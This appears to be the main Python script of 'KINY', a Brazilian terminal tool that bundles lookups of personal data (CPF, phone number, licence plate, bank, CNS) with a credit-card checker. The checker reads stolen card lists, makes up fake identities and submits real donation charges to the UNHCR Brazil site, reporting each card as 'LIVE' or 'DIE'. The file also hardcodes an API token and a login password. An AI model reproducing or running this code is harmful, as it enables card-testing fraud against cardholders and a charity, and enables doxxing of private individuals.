global R,B,C,Y,G,RT,CY,CO
CO='\033[m'
R='\033[1;31m'
B='\033[1;34m'
C='\033[1;37m'
CY='\033[1;36m'
Y='\033[1;33m'
G='\033[1;32m'
RT='\033[;0m'
## Distribuido livremente pela licença MIT,
## Aos que não sabem o que isso significa,sugerimos estudo.
#######################
## Gostamos das suas atualizações no nosso github p0is0n,
## espero que você não fique bravo se usarmos elas,né?
## :p abraços,Yato e Kiny.
#######################
## Obrigado pelo apoio snuking
#######################

def restart():
    python = sys.executable
    os.execl(python, python, *sys.argv)
import os,sys,time,base64, json, re,tools
try:
    import requests,api,platform,signal,atexit,argparse,random,hashlib,urllib3,html5lib,phonenumbers,json,tools
    from colorama import Fore, Style
    from bs4 import BeautifulSoup
    from phonenumbers import carrier
    from phonenumbers import geocoder
    from phonenumbers import timezone
    from urllib.parse import urlencode
except:
    os.system('pip3 install requests phonenumbers urllib3 colorama bs4 html5lib argparse')
    for i in range(3):
    	tools.clear()
    	print(f'{C}[{Y}i{C}] Reiniciando o painel em {i} seg...')
    	time.sleep(1)
    restart()

requests = requests.Session()
def clear_config():
	if os.path.exists('options.txt'):
    			try:
    				os.remove('options.txt')
    			except:
    				os.system('rm options.txt')

	if os.path.exists('user'):
    			try:
    				os.remove('user')
    			except:
    				os.system('rm user')

def write():
    clear_config()
    f = open('options.txt','a')
    f.write(str(login))
    f.write(str(cpf_api))
    f.write(str(ip_api))
    f.write(str(placa_api))
    f.write(str(cnpj_api))
    f.write(str(anim))
    f.write(str(menu_return))
    f.close()
    if os.path.exists('user'):
        os.remove('user')
    f = open("user","a")
    f.write(user)
    f.close

global login
global user
global cpf_api
global ip_api
global placa_api
global cnpj_api

if os.path.exists('options.txt') and os.path.exists('user'):
    f = open('options.txt','r') # Não espero que vc se ache hacker por saber mexer com esse arquivo
    data = f.read()
    login = int(data[0])
    cpf_api = int(data[1])
    ip_api = int(data[2])
    placa_api = int(data[3])
    cnpj_api = int(data[4])
    anim = int(data[5])
    menu_return = int(data[6])
    f.close()
    f = open('user','r')
    user = f.read()
    f.close()
    del data
else:
    login = '1' # Não,eu não vou reclamar por você ter corrompido a data :D
    user = 0
    cpf_api = 0
    ip_api = 0
    placa_api = 0
    cnpj_api = 0
    menu_return = 0
    anim = 0
token = "f01e0024a26baef3cc53a2ac208dd141"

if __name__ == '__main__':
    print(f'{G} Checando por atualizacoes... {C}')
    '''
    update = subprocess.check_output('git pull', shell=True)
    if 'Already up to date' not in update.decode():
        print(f'{G}Atualizacao instalada!\nReiciando app...{C}')
        time.sleep(5)
        subprocess.run('clear')
        restart()
    else:
        print('Nenhuma atualizacao disponivel.')
        time.sleep(2)
        password()
'''

if login == 1:
    tools.clear()
    user = input("USERNAME:  ")
    snh = 'VirtualInsanity'
    if input("PASSWORD:  ").strip() == snh:
        tools.clear()
    else:
        print("{C}[{R}ERROR{C}] Wrong Password....Yare Yare")
        if anim == 1:
            time.sleep(1)
        exit()
    print("\n ")
if user == 'YATO' or user == 'KINY':
    kinymode=1
    kiny=1
    print("Nova Opção Desbloqueada")
else:
    kinymode=0

try:
    os.system("pkg update")
    os.system("pkg install figlet")
except:
    os.system("apt update")
    os.system("apt install figlet")

Sair = False
while(Sair == False):

    tools.clear()
    print(f"Coded By: {CY} KINY {CO} and {CY} YATO {CO} in 07/02/2021")
    print()
    os.system("figlet KINY")
    print(f'{C}[{G}*{C}] Bem vindo,' + user)
    if anim == 1:
        time.sleep(1)
    print()
    print(f"{C}{G}[1]{C} BUSCADOR DE CEP")
    print(f"{C}{G}[2]{C} GEO LOCALIZADOR DE IP")
    print(f"{C}{G}[3]{C} KINY-SITE-INFOGA")
    print(f"{C}{G}[4]{C} CONSULTA DE CNPJ")
    print(f"{C}{G}[5]{C} CONSULTA BANCARIA")
    print(f"{C}{G}[6]{C} CONSULTA CPF")
    print(f"{C}{G}[7]{C} CONSULTA CNS")
    print(f"{C}{G}[8]{C} CONSULTA PLACA")
    print(f"{C}{G}[9]{C} CONSULTA CRM")
    print(f"{C}{G}[10]{C} CONSULTA DE NUMERO")
    print(f"{C}{G}[11]{C} CONSULTA BIN")
    print(f"{C}{G}[12]{C} GERAR PESSOA")
    print(f"{C}{G}[13]{C} MOSTRAR MEU IP")
    print(f"{C}{G}[14]{C} CC CHECKER")
    print(f"{C}{G}[15]{C} COVID19")
    if kinymode == 1:
    	print(f"{C}{G}[16]{C} FERRAMENTAS")
    if anim==1:
        time.sleep(1)
    print()
    if login:
    	pass
    else:
    	print(f"{C}{G}[95]{C} Mudar username")
    print(f"{C}{G}[96]{C} Opções")
    print(f"{C}{G}[97]{C} Notas de versão")
    #print("{C}[{G}98{C}] Auto-update")
    print(f"{C}{G}[99]{C} Update && Upgrade")
    print(f"{C}{G}[00]{C} EXIT")
    op = input("===>").strip()
    tools.clear()
    if op == '95':
    	print()
    	print(f'{C}[{G}i{C}] Me diga como quer ser chamado.')
    	user = input('===>')
    	write()
    if op == '96':
            os.system('figlet KINY')
            print(f'{C}[{G}1{C}] Login : {login}')
            print(f'{C}[{G}2{C}] Trocar APIs')
            print(f'{C}[{G}3{C}] Limpar data')
            print(f'{C}[{G}4{C}] Animação: {anim}')
            print(f'{C}[{G}5{C}] Inserir token pessoal')
            print(f'{C}[{G}6{C}] Modo retornar ao menu: {menu_return}')
            print()
            print(f'{C}[{G}0{C}] Voltar')
            choice = input('===>')
            tools.clear()
            if choice == '1' or choice == '01':
                login ^= 1
            if choice == '2' or choice == '02':
                lista_api_cpf = ["MTE","null"]
                cpf_api_name = (lista_api_cpf[cpf_api])
                lista_api_ip = ["IP-API 1","API-IP 2","Todas"]
                ip_api_name = (lista_api_ip[ip_api])
                lista_api_cnpj = ["receitaws","Governo","Todas"]
                cnpj_api_name = (lista_api_cnpj[cnpj_api])
                lista_api_placa = ["receitaws","Governo","Todas"]
                placa_api_name = (lista_api_placa[placa_api])
                print(f'{C}[{G}1{C}] CPF API: {cpf_api_name}')
                print(f'{C}[{G}2{C}] IP API: {ip_api_name}')
                print(f'{C}[{G}3{C}] PLACA API: {placa_api_name}')
                print(f'{C}[{G}4{C}] CNPJ API: {cnpj_api_name}')
                print()
                print(f'{C}[{G}0{C}] Voltar')
                choice2 = input('===>')

                if choice2 == '1' or choice2 == '01':
                    cpf_api = cpf_api + 1
                if choice2 == '2' or choice2 == '02':
                    ip_api = ip_api + 1
                if choice2 == '3' or choice2 == '03':
                    placa_api = placa_api + 1
                if choice2 == '4' or choice2 == '04':
                    cnpj_api = cnpj_api + 1

                if int(cpf_api) >= int('3'):
                    cpf_api = 0
                if int(cnpj_api) >= int('3'):
                    cnpj_api = 0
                if int(placa_api) >= int('3'):
                    placa_api = 0
                if int(ip_api) >= int('3'):
                    ip_api = 0
            if choice == '3' or choice == '03':
                clear_config()
            if choice == '4' or choice == '04':
                anim ^= 1
            if choice == '5' or choice == '05':
                print(f'{C}[{G}i{C}] Digite o seu token de acesso ou d para o token de acesso publico.')
                token = input('===>')
                if token == d:
                    token = "f01e0024a26baef3cc53a2ac208dd141"
            if choice != 1 and choice !=2 and choice !=3 and choice!=4 and choice!=5 and choice!=0:
                tools.clear()
                print(f'{C}[{R}ERROR{C}] Opção inválida')
            write()

    if op == '97':
        tools.notes()
    if op == '15':
    	tools.covid19()
    if op == '14':
        def checker(cc,mes,ano,cvv):
            r=requests.request('GET','https://lookup.binlist.net/'+cc[0:6]).json()
            band=r.get('scheme')
            tipo=r.get('type')
            pais=r.get('country')
            banco=r.get('bank')
            nivel=r.get('brand')


            if tipo=='credit':
                tipo2='C'
            else:
                tipo2='D'

            print(f'''
{G}[+]{C}Consultando dados do cartão:
{Y}[*]{C}Cartao: {B}{gg}
{Y}[*]{C}Bandeira: {B}{band}
{Y}[*]{C}Tipo: {B}{tipo}
{Y}[*]{C}Nivel: {B}{nivel}
{Y}[*]{C}Pais: {B}{pais.get('name')}
{Y}[*]{C}Banco: {B}{banco.get('name')}''')

            pessoa=requests.request('GET','https://randomuser.me/api/?nat='+pais.get('alpha2').lower()).json()
            genero=pessoa['results'][0]['gender']
            if genero=='female':
                genero2=genero.replace('female','Mulher')
                genero3='F'
            else:
                genero2=genero.replace('male','Homem')
                genero3='M'
            pnome=pessoa['results'][0]['name']['first']
            sobrenome=pessoa['results'][0]['name']['last']
            nome=pnome +' ' +sobrenome
            nascimento=pessoa['results'][0]['dob']['date'][0:10]
            if pais.get('alpha2')=='BR':
                d=nascimento.split('-')[2]
                m=nascimento.split('-')[1]
                a=nascimento.split('-')[0]
                nascimento=d+'/'+m+'/'+a
            cpf=requests.request('GET','http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cpf2=cpf['data']['number_formatted']
            cpf=cpf['data']['number']
            email=pnome.replace(' ','.')+'.'+sobrenome.replace(' ','.')+'@outlook.com'
            email=email.lower().encode('ascii','ignore').decode('ascii')
            cidade=pessoa['results'][0]['location']['city']
            estado=pessoa['results'][0]['location']['state']
            endereco=pessoa['results'][0]['location']['street']['name']
            cep=str(pessoa['results'][0]['location']['postcode'])
            if pais.get('alpha2')=='BR':
                cep=cep+'-000'
            bairro='Centro'

            for key, value in estados.items():
                estado=estado.replace(key,value)

            print(f'''
{G}[+]{C}Gerando pessoa aleatoria:
{Y}[*]{C}Genero: {B}{genero2}
{Y}[*]{C}Nome: {B}{nome}
{Y}[*]{C}Nascimento: {B}{nascimento}
{Y}[*]{C}CPF: {B}{cpf2}
{Y}[*]{C}E-Mail: {B}{email}
{Y}[*]{C}Endereço: {B}{endereco}
{Y}[*]{C}CEP/ZIP: {B}{cep}
{Y}[*]{C}Cidade: {B}{cidade}
{Y}[*]{C}Estado: {B}{estado}
''')

            donate='https://doar.acnur.org/api/ACNURBR/donate.html'
            h = {
                'Host': 'doar.acnur.org',
                'Connection': 'keep-alive',
                'Content-Length': '1036',
                'Cache-Control': 'max-age\u003d0',
                'Origin': 'https://doar.acnur.org',
                'Upgrade-Insecure-Requests': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
                'Sec-Fetch-Site': 'same-origin',
                'Referer': 'https://doar.acnur.org/acnur/donate.html',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
                'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
                }

            data='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pnome+'&LASTNAME='+sobrenome+'&EMAIL='+email.replace('@','%40')+'&GENDER='+genero3+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+endereco.replace(' ','+')+'&STREET2='+bairro.replace(' ','+')+'&CITY='+cidade.replace(' ','+')+'&STATE='+estado+'&ZIP='+cep+'&COUNTRY='+pais.get('alpha2')+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo2+'%2F'+band+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv

            RS=requests.request('POST',donate,headers=h,data=data)
            RS=RS.url
            if RS=='https://doar.acnur.org/acnur/agradecimento.html':
                print(f'{G}[+]{C}Pagamento autorizado! {G}Cartão LIVE!{C}')
            else:
                RS=RS.split('=')[3]
                if RS=='REFUSED_PAYMENT':
                    print(f'{R}[-]{C}Transação recusada ({R}Possivel IP Block{C}).')
                elif RS=='DATA_INVALID':
                    print(f'{R}[-]{C}Cartão invalido ({R}DIE{C}).')
                elif RS=='FAIL_UNKNOWN':
                    print(f'{R}[-]{C}Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
                elif RS=='ERROR_NETWORK':
                    print(f'{R}[-]{C}Erro de rede.')
                elif RS=='DATA_CARD_NOT_ALLOWED':
                    print(f'{R}[-]{C}Pagamento nao autorizado.')
                elif RS=='REFUSED_PROVIDER':
                    print(f'{R}[-]{C}Pagamento recusado pela {Y}{band}{C}.')
                elif RS=='REFUSED_BANK':
                    print('{}[-]{}Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
                elif RS=='DATA_MISSING':
                    print(f'{R}[-]{C}Algum dado faltando.')
                else:
                    print(f'{Y}Erro nao listado{R}{RS}{RT}')
        tools.clear()
        os.system('figlet KINY')
        try:
            lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
        except:
            print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
            time.sleep(3)
            pass
        for gg in lista:
            cc=gg.split('|')[0]
            mes=gg.split('|')[1]
            ano=gg.split('|')[2]
            cvv=gg.split('|')[3]
            checker(cc,mes,ano,cvv)
    if op == '13':
    	tools.ip(ip_api)
    if op == '12':
        print(f'{C}[{G}i{C}] Gerando...')
        tools.gerar_pessoa()
    if op == '11':
        tools.bin()
        tools.clear()

        consultabin()
    if op == '10':
        def consultaphone():
            api.phone()
            print(f'{C}[{Y}i{C}]Deseja realizar uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            choice = input("===>")
            if choice == '1' or choice == '01':
                tiposop()
            if choice == '2' or choice == '02':
                pass
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        def consultaoperadora():
            tools.clear()
            os.system("figlet KINY")
            global op_input
            print(f'{C}[{G}i{C}] Exemplo: 48952021826')
            print(f'{C}[{Y}i{C}] Limite de consultas: 6 consultas por hora.')
            print(f'{C}[{Y}i{C}] Digite o numero com DDD.')
            op_input = input("===>")
            headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
            try:
                request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero='+op_input, headers=headers)
                op_data = request.json()
            except:
                print(f'{C}[{R}i{C}] Limite de consultas atingido')
                print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
                print('1.Sim')
                print('2.Não')
                cho = input("===>")
                if cho == '1' or cho == '01':
                    consultaoperadora()
                if cho == '2' or cho == '02':
                    pass
                else:
                    print(f'{C}[{R}i{C}] Opção inválida')
            op_final = 'null'
            if (op_data['operadora']) == '553016':
                op_final = 'CLARO'
            if (op_data['operadora']) == '553070':
                op_final = 'OI'
            if (op_data['operadora']) == '553066':
                op_final = 'NEXTEL'
            if (op_data['operadora']) == '553102':
                op_final = 'TIM'
            if (op_data['operadora']) == '553097':
                op_final = 'VIVO'
            elif (op_data['operadora']) == '99':
                print(f'{C}[{R}*{C}] Não foi possível consultar a operadora')
            if op_final == 'null':
                print(f'{C}[{R}*{C}] Operadora invalida.')
            else:
                print(f'{C}[{G}*{C}] Operadora:'+op_final)
            #print(op_data['operadora'])
            print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            cho = input("===>")
            if cho == '1' or cho == '01':
                consultaoperadora()
            if cho == '2' or cho == '02':
                pass
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        def tiposop():
            tools.clear()
            os.system('figlet KINY')
            print(f'O que deseja fazer?')
            print('1.Consultar operadora por numero')
            print('2.Phone infoga')
            choi = input('===>')
            if choi == '1' or choi == '01':
                consultaoperadora()
            if choi == '2' or choi == '02':
                consultaphone()
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        tiposop()
    if op == '9' or op == '09':
        tools.crm()
        del crm_input
        del uf_input
        del url
        del crm_data
        print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
        print('1.Sim')
        print('2.Não')
        choice = input("===>")
        if choice == "1" or choice == "01":
            consultacrm()
        if choice == "2" or choice == "02":
            pass
        else:
            print("Opcao invalida.")

    if op == '8' or op == '08':
        #def gerarplaca():
        #def tiposplaca():
        tools.consultaplaca()
        del placa_data
        del req
        del placa_input
        print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
        print('1.Sim')
        print('2.Não')
        choice = input("===>")
        if choice == "1" or choice == "01":
            tools.consultaplaca()
        if choice == "2" or choice == "02":
            pass
        else:
            print("Opcao invalida.")
    if op == '7' or op == '07':
            token = "f01e0024a26baef3cc53a2ac208dd141"
            tools.cns(token,anim)
            print(f"{C}{G}DESEJA REALIZAR UMA NOVA CONSULTA?{C}")
            print(f"{C}{G}[1]{C} Sim")
            print(f"{C}{G}[2]{C} Não")
            lo = input('===> ')
            if lo == '1' or lo == '01':
                tipocns()
            else:
                pass
    if op == '6' or op == '06':
        def gerarcpf():
            os.system('figlet KINY')
            print(f'{C}[{G}i{C}] Gerando CPF...')
            time.sleep(1)
            cpf=requests.request('GET','http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cpf2=cpf['data']['number_formatted']
            cpf=cpf['data']['number']
            print(f'{C}[{Y}i{C}] O CPF gerado foi: {B}'+cpf2)
            time.sleep(1)
            print(f'{C}[{G}i{C}] Consultando CPF gerado...')
            tools.consulta(cpf)
        def tipos():
            tools.clear()
            os.system('figlet KINY')
            print(f"""
{C}[{G}i{C}] Formas de operação:
    1.Consultar CPF
    2.Gerar CPF e consultar
    3.Voltar
{C}[{Y}i{C}] Selecione a forma de operação.
""")
            tool=input(f'===>')
            if tool=='1' or tool == '01':
                cpf=input(f'{C}[{Y}i{C}] Informe o CPF a ser consultado (sem pontos ou traços): {B}')
                tools.clear()
                tools.consulta(cpf)
            elif tool=='2' or tool == '02':
                gerarcpf()
            elif tool=='3' or tool == '03':
                pass
            else:
                print(f'{C}[{R}-{C}] Seleção inválida.')
                time.sleep(1)
                tipos()
        tipos()


    if op == '5' or op == '05':
        tools.bank(anim)
    if op == '1' or op == '01':
        tools.cep(anim)

    if op == '00' or op == '0':
        os.system("clear")
        Sair = True

    if op == '99' or op == '99':
        os.system("clear")
        os.system("pkg update && pkg update")
        pass

    if op == '3' or op == '03':
        tools.kiny_infoga()

    if op == '2' or op == '02':
        mode = 1
        tools.ip(ip_api,mode)

    if op == '4' or op == '04':
        os.system('figlet KINY')
        print(f'''
{C}[{Y}i{C}] O QUE DESEJA FAZER?
{C}[{G}1{C}] GERAR CNPJ
{C}[{G}2{C}] CONSULTAR CNPJ
        ''')
        kct = input("===> ")
        tools.cnpj(kct,token,anim)
os.system('rm -rf __pycache__')
print(f'{C}{R} Arrivederci{C}')
